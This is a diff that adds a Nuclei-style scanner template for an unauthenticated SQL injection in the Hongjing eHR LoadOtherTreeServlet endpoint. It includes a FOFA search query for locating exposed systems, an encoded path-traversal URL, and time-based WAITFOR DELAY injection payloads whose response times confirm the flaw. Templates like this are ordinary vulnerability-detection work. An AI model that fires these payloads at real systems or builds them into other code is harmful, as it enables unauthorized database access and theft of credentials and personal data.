@@ -1,0 +1,39 @@
+id: hongjingeHR-LoadOtherTreeServlet-sql
+
+info:
+  name: "宏景 eHR LoadOtherTreeServlet 接口 SQL 注入"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="HJSOFT-HCM"
+      宏景eHR系统LoadOtherTreeServlet组件存在SQL注入漏洞，攻击者可通过构造恶意请求在无需身份验证的情况下执行任意SQL语句，导致数据库敏感信息泄露（包括但不限于管理员凭证、用户隐私数据）。在特定权限条件下，该漏洞可能被利用实施远程代码执行，通过向服务器写入恶意负载实现持久化控制。
+  reference:
+  - https://Unknown.blog.csdn.net/article/details/140246183
+  tags: 宏景eHR
+
+
+
+http:
+- raw:
+  - |
+    GET /w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=1%29%3BWAITFOR+DELAY+%270%3A0%3A4%27--&flag=1 HTTP/1.1
+    Host: {{Hostname}}
+
+  - |
+    GET /w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=1%29%3BWAITFOR+DELAY+%270%3A0%3A8%27--&flag=1 HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+  - type: status
+    status:
+    - 200
+
+
+
+
+
